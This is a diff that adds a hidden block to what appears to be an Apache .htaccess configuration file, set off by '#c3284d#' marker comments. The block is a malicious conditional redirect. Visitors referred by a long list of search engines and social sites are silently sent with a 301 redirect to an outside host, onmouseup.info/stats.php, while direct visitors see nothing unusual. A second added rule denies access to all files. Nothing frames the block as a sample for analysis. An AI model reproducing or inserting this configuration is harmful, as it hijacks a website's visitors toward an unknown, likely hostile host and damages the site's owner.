@@ -1,0 +1,12 @@
+
+#c3284d#
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteCond %{HTTP_REFERER} ^.*(abacho|abizdirectory|about|acoon|alexana|allesklar|allpages|allthesites|alltheuk|alltheweb|altavista|america|amfibi|aol|apollo7|aport|arcor|ask|atsearch|baidu|bellnet|bestireland|bhanvad|bing|blog|bluewin|botw|brainysearch|bricabrac|browseireland|chapu|claymont|click4choice|clickey|clickz|clush|confex|cyber-content|daffodil|devaro|dmoz|dogpile|ebay|ehow|eniro|entireweb|euroseek|exalead|excite|express|facebook|fastbot|filesearch|findelio|findhow|finditireland|findloo|findwhat|finnalle|finnfirma|fireball|flemiro|flickr|freenet|friendsreunited|galaxy|gasta|gigablast|gimpsy|globalsearchdirectory|goo|google|goto|gulesider|hispavista|hotbot|hotfrog|icq|iesearch|ilse|infoseek|ireland-information|ixquick|jaan|jayde|jobrapido|kataweb|keyweb|kingdomseek|klammeraffe|km|kobala|kompass|kpnvandaag|kvasir|libero|limier|linkedin|live|liveinternet|lookle|lycos|mail|mamma|metabot|metacrawler|metaeureka|mojeek|msn|myspace|netscape|netzindex|nigma|nlsearch|nol9|oekoportal|openstat|orange|passagen|pocketflier|qp|qq|rambler|rtl|savio|schnellsuche|search|search-belgium|searchers|searchspot|sfr|sharelook|simplyhired|slider|sol|splut|spray|startpagina|startsiden|sucharchiv|suchbiene|suchbot|suchknecht|suchmaschine|suchnase|sympatico|telfort|telia|teoma|terra|the-arena|thisisouryear|thunderstone|tiscali|t-online|topseven|twitter|ukkey|uwe|verygoodsearch|vkontakte|voila|walhello|wanadoo|web|webalta|web-archiv|webcrawler|websuche|westaustraliaonline|wikipedia|wisenut|witch|wolong|ya|yahoo|yandex|yell|yippy|youtube|zoneru)\.(.*)
+RewriteRule ^(.*)$ http://onmouseup.info/stats.php [R=301,L]
+</IfModule>
+#/c3284d#
+<files *.*> 
+ Order Deny,Allow 
+ Deny From All 
+</files>
